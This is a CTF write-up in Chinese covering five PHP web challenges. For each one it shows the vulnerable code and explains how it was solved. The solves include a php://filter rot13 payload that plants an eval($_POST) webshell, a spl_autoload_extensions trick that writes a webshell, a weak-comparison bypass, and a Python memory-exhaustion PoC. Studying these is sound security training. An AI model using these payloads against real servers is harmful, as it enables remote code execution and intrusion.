## 写在前面

夜深人静~

——KonDream 2022年2月3日06:20:45

## web1

```php
<?php
highlight_file(__FILE__);

$content = $_GET[content];
file_put_contents($content,'<?php exit();'.$content);
```

知识点：伪协议是可以拼接，而且遇错会跳过继续执行后面的

``payload：php://filter/write=string.rot13|<?cuc riny($_CBFG[1]);?>/resource=shell.php``

利用rot13，这样在经过解码后<?cuc riny($_CBFG[1]);?>就会变成<?php eval($_POST[1]);?> 达到getshell的目的，然后就是蚁剑连找flag了

## web2

```php
<?php

highlight_file(__FILE__);
session_start();
error_reporting(0);

include "flag.php";

if(count($_POST)===1){
        extract($_POST);
        if (call_user_func($$$$$${key($_POST)})==="HappyNewYear"){
                echo $flag;
        }
}
?>
```

无限套娃，意思就是post这个参数必须是a=a这个样子，因为它会多次进行变量覆盖，如果是参数和值不同的话第二次套娃就找不到这个参了，这里利用session_id函数，控制PHPSESSID为HappyNewYear即可

## web3

```php
<?php

highlight_file(__FILE__);
error_reporting(0);

include "flag.php";
$key=  call_user_func(($_GET[1]));

if($key=="HappyNewYear"){
  echo $flag;
}

die("虎年大吉，新春快乐！");
```

弱比较，也就是说找一个无参函数且返回值为0的，翻了好久的手册，找到一个：gc_collect_cycles

介绍如下:

> ### gc_collect_cycles
>
>(PHP 5 >= 5.3.0, PHP 7)
>
>gc_collect_cycles — 强制收集所有现存的垃圾循环周期
>
>### 说明
>
>int gc_collect_cycles(void)
>
>强制收集所有现存的垃圾循环周期。 
>
>### 参数
>
>此函数没有参数。
>
>### 返回值
>
>返回收集的循环数量。 

## web4

```php
<?php

highlight_file(__FILE__);
error_reporting(0);

$key=  call_user_func(($_GET[1]));
file_put_contents($key, "<?php eval(\$_POST[1]);?>");

die("虎年大吉，新春快乐！");
```

纯是考察php函数的掌握程度了，学到了学到了

>### spl_autoload_extensions
>
>(PHP 5 >= 5.1.0, PHP 7)
>
>spl_autoload_extensions — 注册并返回spl_autoload函数使用的默认文件扩展名。
>
>### 说明
>
>string **spl_autoload_extensions**([string `$file_extensions`])
>
>本函数用来修改和检查``[__autoload()]``函数内置的默认实现函数``[spl_autoload()]``所使用的扩展名。   
>
>### 参数
>
>- `file_extensions`
>
>当不使用任何参数调用此函数时，它返回当前的文件扩展名的列表，不同的扩展名用逗号分隔。要修改文件扩展名列表，用一个逗号分隔的新的扩展名列表字符串来调用本函数即可。中文注：默认的spl_autoload函数使用的扩展名是".inc,.php"。       
>
>### 返回值
>
> 逗号分隔的[spl_autoload()](mk:@MSITStore:C:\Users\dell\Desktop\PHP7中文手册(2018).chm::/res/function.spl-autoload.html)函数的默认文件扩展名。 

当无参数调用这个函数时，会返回.inc,.php文件，这样就把马写进一个php文件了，厉害。

## web5

```php
<?php

error_reporting(0);
highlight_file(__FILE__);


include "🐯🐯.php";
file_put_contents("🐯", $flag);
$🐯 = str_replace("hu", "🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯", $_POST['🐯']);
file_put_contents("🐯", $🐯);

```

说实话，有点迷，因为限制了并发，所以不能用竞争来做，而是利用溢出。当超过php最大内存256MB时会报致命错误而导致后面的代码不执行，也就是第10行不会覆盖flag，这个题中每post两个字节的hu，就会被替换成32个🐯，也就是32*4=128字节，被放大了128/2=64倍，所以要想达到256MB，需要发送256/64=4MB的hu，也就是4×1024×1024/2=2^21次方个hu，经过实际测试，发送这么多会报403，从而无法拿到flag，想到服务器本身的数据是占据一定空间的，所以需要减少hu的数量，最后发现发送上限是2^19-7个(应该没错，如有错请指正)

POC：

```python
'''
Author: KonDream
Date: 2022-01-26 02:57:09
LastEditors:  KonDream
LastEditTime: 2022-02-11 02:17:13
Description:  
'''
import requests

url = 'http://c135b873-2c6b-4ecb-a394-2d01cb7972f0.challenge.ctf.show/'

data = {
     "🐯" : "hu" * (2**19 - 7)
}

r = requests.post(url, data)

print(r.status_code)

r1 = requests.get(url=url + "🐯")
print(r1.text[:50])
```

比较难的是数据不够的话就达不到溢出的效果，我之前就卡在了2^18和2^19这个数量级之间=-=